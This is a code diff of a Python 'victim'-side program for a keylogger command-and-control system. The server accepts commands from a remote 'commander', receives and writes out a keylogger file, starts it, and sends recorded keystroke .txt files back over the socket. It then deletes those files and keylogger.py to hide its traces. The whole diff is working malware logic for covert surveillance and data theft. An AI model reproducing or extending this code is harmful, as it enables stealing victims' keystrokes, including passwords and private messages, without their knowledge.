@@ -6,24 +6,14 @@ import threading
 from victim_utils import *
 
 if __name__ == '__main__':
-    # Print banner
-    print(constants.OPENING_BANNER)
+    # GetOpts arguments
+    source_ip, source_port = parse_arguments()
 
-    # Create a socket object
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Define the server address and port
-    server_address = ('localhost', 8887)
-
-    # Bind the socket to the server address and port
-    server_socket.bind(server_address)
-
-    # Listen for incoming connections (maximum 5 clients in the queue)
-    server_socket.listen(5)
-    print("[+] Server is listening on IP {} on port {}".format(*server_address))
+    # Initialize server socket
+    server_socket = initialize_server_socket(source_ip, source_port)
 
     while True:
-        print("[+] Waiting for a connection...")
+        print(constants.WAIT_CONNECTION_MSG)
         client_socket, client_address = server_socket.accept()
         print("[+] Accepted connection from {}:{}".format(*client_address))
         print(constants.MENU_CLOSING_BANNER)
@@ -33,10 +23,10 @@ if __name__ == '__main__':
                 # Receive data from the client
                 data = client_socket.recv(1024)
                 if not data:
-                    print("[+] Client {}:{} disconnected.".format(client_address[0], client_address[1]))
+                    print(constants.CLIENT_DISCONNECT_MSG.format(client_address[0], client_address[1]))
                     break
 
-                # CHECK: Command to start keylogger program
+# a) Command to start/stop keylogger program
                 if data.decode() == constants.START_KEYLOG_MSG:
                     print(constants.START_KEYLOGGER_PROMPT)
                     client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
@@ -85,22 +75,24 @@ if __name__ == '__main__':
                                     # Ensure thread closes and does not stall program
                                     watcher_thread.join()
 
+                                    # Print status and send to commander
                                     print(constants.KEYLOG_SUCCESS_MSG.format(file_name))
-                                    client_socket.send(constants.STATUS_TRUE.encode())
-                                    client_socket.send(constants.KEYLOG_SUCCESS_MSG_TO_CMDR.format(file_name).encode())
+                                    parsed_msg = (constants.STATUS_TRUE + "/" + constants.KEYLOG_SUCCESS_MSG_TO_CMDR.
+                                                  format(file_name))
+                                    client_socket.send(parsed_msg.encode())
                                 else:
                                     client_socket.send(constants.STATUS_FALSE.encode())
-                                    client_socket.send(constants.FAILED_IMPORT_MSG.format(module_name).encode())
-
+                                    parsed_msg = (constants.STATUS_FALSE + "/" + constants.FAILED_IMPORT_MSG
+                                                  .format(module_name))
+                                    client_socket.send(parsed_msg.encode())
                         else:
                             print(constants.FILE_NOT_FOUND_ERROR.format(file_name))
                             status = client_socket.send(constants.STATUS_FALSE.encode())
                             msg = client_socket.send(constants.FILE_NOT_FOUND_TO_CMDR_ERROR.format(file_name).encode())
 
-                # CHECK: Command to stop keylogger program
 
-                # CHECK: Command to get keylog program from commander
-                if data.decode() == constants.TRANSFER_KEYLOG_MSG:
+# b) Command to GET keylog program from commander
+                if data.decode() == constants.GET_KEYLOGGER_MSG:
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
                     client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
 
@@ -108,7 +100,7 @@ if __name__ == '__main__':
                     filename = client_socket.recv(1024).decode()
                     print(constants.RECEIVING_FILE_MSG.format(filename))
 
-                    with open(filename, "wb") as file:
+                    with open(filename, constants.WRITE_BINARY_MODE) as file:
                         while True:
                             data = client_socket.recv(1024)
                             if not data:
@@ -126,13 +118,68 @@ if __name__ == '__main__':
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
 
-                # Check if data is to send recorded keystroked file to commander
 
-                # Check if data is to terminate connection
+# c) Check if data is to send recorded keystroked file to commander
+                if data.decode() == constants.TRANSFER_KEYLOG_FILE_MSG:
+                    print(constants.CLIENT_RESPONSE.format(data.decode()))
+                    print("[+] Client has requested to transfer all recorded keylog files...")
+                    print("[+] Now checking if there are any potentially recorded keylog '.txt' files...")
 
-                # Send the same data back to the client
-                # client_socket.send(data)
-                print("[+] Sent data back to the client.")
+                    # Get the current directory
+                    current_directory = os.getcwd()
+
+                    # List all files in the current directory
+                    files_in_directory = os.listdir(current_directory)
+
+                    # Check if there are any .txt files
+                    txt_files = [file for file in files_in_directory if file.endswith('.txt')]
+
+                    if txt_files:
+                        print(constants.SEARCH_FILES_SUCCESSFUL_MSG.format(len(txt_files)))
+                        client_socket.send(constants.SEARCH_FILES_SUCCESSFUL_SEND.format(len(txt_files)).encode())
+
+                        # WAIT FOR ACK
+                        res = client_socket.recv(200).decode()
+
+                        # Send number of files to commander
+                        client_socket.send(str(len(txt_files)).encode())
+
+                        # WAIT FOR ACK
+                        client_socket.recv(200)
+
+                        # Send file(s) in current directory
+                        for file_name in txt_files:
+                            client_socket.send(file_name.encode())
+
+                            with open(file_name, 'rb') as file:
+                                while True:
+                                    data = file.read(1024)
+                                    if not data:
+                                        break
+                                    client_socket.send(data)
+
+                            # Send EOF signal to prevent receiver's recv() from blocking
+                            client_socket.send(constants.END_OF_FILE_SIGNAL)
+
+                            # Get an ACK from victim for success
+                            transfer_result = client_socket.recv(1024).decode()
+
+                            # Delete .txt keylog file after successful transfer
+                            if transfer_result == constants.VICTIM_ACK:
+                                print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_name,
+                                                                                client_address[0],
+                                                                                client_address[1]))
+                                # Delete .txt file
+                                delete_file(file_name)
+                            else:
+                                print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+
+                        # Delete keylogger.py from client/victim
+                        delete_file(constants.KEYLOG_FILE_NAME)
+                    else:
+                        # If no .txt keylog files present
+                        print(constants.SEARCH_FILES_ERROR_MSG)
+                        client_socket.send(constants.SEARCH_FILES_ERROR_SEND.encode())
 
         except ConnectionResetError:
             print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
